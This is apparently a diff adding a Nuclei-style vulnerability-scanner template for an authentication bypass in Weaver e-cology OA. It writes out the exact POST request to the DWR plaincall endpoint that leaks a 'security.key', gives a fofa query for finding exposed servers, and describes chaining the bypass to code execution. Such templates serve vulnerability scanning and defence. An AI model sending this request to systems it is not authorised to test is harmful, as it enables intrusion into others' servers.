@@ -1,0 +1,27 @@
+id: ecology-plaincall-login-bypass
+
+info:
+  name: Ecology plaincall Login Bypass
+  author: Co5mos
+  severity: high
+  description: |
+    泛微 e-cology 存在后台代码执行漏洞，攻击者通过认证绕过漏洞结合代码执行漏洞可获取服务器权限。
+  metadata:
+    verified: true
+    fofa-query: app="泛微-OA（e-cology）"
+  tags: weaver, login
+
+http:
+  - raw:
+    - |
+      POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1 HTTP/1.1
+      Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'dwr.engine._remoteHandleCallback')"
+          - "contains(body, 'security.key')"
+          - "!regex('security.key.:.?(NULL)', body)"
+        condition: and
